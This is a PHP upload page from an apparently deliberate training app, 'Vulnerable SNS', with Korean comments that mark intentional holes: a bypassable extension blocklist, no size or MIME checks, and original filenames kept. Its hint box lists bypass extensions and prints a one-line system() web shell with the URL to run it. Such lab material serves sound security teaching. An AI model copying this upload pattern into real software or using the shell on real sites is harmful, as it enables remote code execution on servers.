<?php
// upload.php - 파일 업로드 (취약점 포함)
include 'config.php';
requireLogin();

$user = getCurrentUser();
$success = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $filename = $file['name'];
    $tmp_name = $file['tmp_name'];
    $file_size = $file['size'];

    // 중급 보안: 일부 확장자만 차단 (우회 가능)
    $blocked_extensions = ['php', 'sh', 'exe', 'bat'];
    $file_extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

    $is_blocked = false;
    foreach ($blocked_extensions as $ext) {
        if ($file_extension === $ext) {
            $is_blocked = true;
            break;
        }
    }

    // 취약점: .php5, .phtml 등은 차단되지 않음
    // 취약점: 파일 크기 제한 없음
    // 취약점: MIME 타입 검증 없음

    if ($is_blocked) {
        $error = "⚠️ 해당 파일 형식은 업로드할 수 없습니다.";
    } else {
        // 파일명 생성 (취약점: 원본 파일명 유지)
        $upload_path = UPLOAD_DIR . $filename;

        if (move_uploaded_file($tmp_name, $upload_path)) {
            $success = "✅ 파일 업로드 성공: " . htmlspecialchars($filename);
            $success .= "<br><a href='file.php?name=" . urlencode($filename) . "'>파일 보기</a>";
        } else {
            $error = "❌ 파일 업로드 실패!";
        }
    }
}

// 업로드된 파일 목록
$uploaded_files = [];
if (is_dir(UPLOAD_DIR)) {
    $files = scandir(UPLOAD_DIR);
    foreach ($files as $file) {
        if ($file != '.' && $file != '..' && is_file(UPLOAD_DIR . $file)) {
            $uploaded_files[] = $file;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>파일 업로드 - Vulnerable SNS</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #fafafa;
            min-height: 100vh;
        }
        .navbar {
            background: white;
            border-bottom: 1px solid #dbdbdb;
            padding: 15px 0;
        }
        .nav-content {
            max-width: 975px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .back-btn {
            color: #262626;
            text-decoration: none;
            font-size: 18px;
        }
        h1 {
            font-size: 20px;
            color: #262626;
        }
        .container {
            max-width: 800px;
            margin: 40px auto;
            padding: 0 20px;
        }
        .card {
            background: white;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            padding: 30px;
            margin-bottom: 20px;
        }
        .card h2 {
            margin-bottom: 20px;
            color: #262626;
            font-size: 18px;
        }
        .upload-area {
            border: 2px dashed #dbdbdb;
            border-radius: 8px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
        }
        .upload-area:hover {
            border-color: #667eea;
            background: #f8f9fa;
        }
        .upload-area i {
            font-size: 48px;
            color: #667eea;
            margin-bottom: 15px;
        }
        input[type="file"] {
            display: none;
        }
        .btn {
            padding: 12px 24px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
            display: inline-block;
            margin-top: 15px;
        }
        .btn:hover {
            transform: translateY(-2px);
        }
        .success {
            background: #d4edda;
            color: #155724;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #28a745;
        }
        .success a {
            color: #155724;
            font-weight: 600;
        }
        .error {
            background: #fee;
            color: #c33;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 20px;
            border-left: 4px solid #c33;
        }
        .warning {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 20px;
            color: #856404;
            font-size: 13px;
        }
        .file-list {
            margin-top: 20px;
        }
        .file-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 15px;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            margin-bottom: 10px;
            transition: all 0.2s;
        }
        .file-item:hover {
            background: #f8f9fa;
        }
        .file-info {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .file-icon {
            font-size: 24px;
            color: #667eea;
        }
        .file-actions a {
            color: #667eea;
            text-decoration: none;
            margin-left: 15px;
            font-size: 14px;
        }
        .file-actions a:hover {
            text-decoration: underline;
        }
        .info-box {
            background: #e3f2fd;
            border-left: 4px solid #2196f3;
            padding: 15px;
            border-radius: 8px;
            margin-top: 20px;
            font-size: 13px;
        }
        .info-box code {
            background: white;
            padding: 2px 6px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            display: block;
            margin: 5px 0;
        }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-content">
            <a href="index.php" class="back-btn">
                <i class="fas fa-arrow-left"></i>
            </a>
            <h1>파일 업로드</h1>
        </div>
    </nav>

    <div class="container">
        <div class="warning">
            <strong>⚠️ 파일 업로드 취약점:</strong> 확장자 검증 우회 가능, 파일 크기 제한 없음<br>
            💡 힌트: .php는 차단되지만 .php5, .phtml 등은 가능합니다.
        </div>

        <?php if ($success): ?>
            <div class="success"><?php echo $success; ?></div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="error"><?php echo $error; ?></div>
        <?php endif; ?>

        <div class="card">
            <h2><i class="fas fa-cloud-upload-alt"></i> 파일 업로드</h2>

            <form method="POST" enctype="multipart/form-data" id="uploadForm">
                <div class="upload-area" onclick="document.getElementById('fileInput').click()">
                    <i class="fas fa-cloud-upload-alt"></i>
                    <p>클릭하여 파일 선택</p>
                    <input type="file" name="file" id="fileInput" onchange="document.getElementById('uploadForm').submit()">
                </div>
            </form>

            <div class="info-box">
                <strong><i class="fas fa-info-circle"></i> 업로드 취약점 테스트:</strong><br>
                <strong>차단된 확장자:</strong> .php, .sh, .exe, .bat<br>
                <strong>우회 가능:</strong> .php5, .phtml, .php3, .php7, .phps<br>
                <strong>웹쉘 예제:</strong><br>
                <code>&lt;?php system($_GET['cmd']); ?&gt;</code>
                파일명: shell.php5 로 업로드 후 file.php?name=shell.php5&cmd=whoami
            </div>
        </div>

        <div class="card">
            <h2><i class="fas fa-folder-open"></i> 업로드된 파일 (<?php echo count($uploaded_files); ?>개)</h2>

            <div class="file-list">
                <?php if (count($uploaded_files) > 0): ?>
                    <?php foreach ($uploaded_files as $file): ?>
                    <div class="file-item">
                        <div class="file-info">
                            <i class="fas fa-file file-icon"></i>
                            <span><?php echo htmlspecialchars($file); ?></span>
                        </div>
                        <div class="file-actions">
                            <a href="file.php?name=<?php echo urlencode($file); ?>">
                                <i class="fas fa-eye"></i> 보기
                            </a>
                            <a href="download.php?file=<?php echo urlencode($file); ?>">
                                <i class="fas fa-download"></i> 다운로드
                            </a>
                        </div>
                    </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <p style="text-align: center; color: #8e8e8e; padding: 20px;">업로드된 파일이 없습니다.</p>
                <?php endif; ?>
            </div>
        </div>
    </div>
</body>
</html>
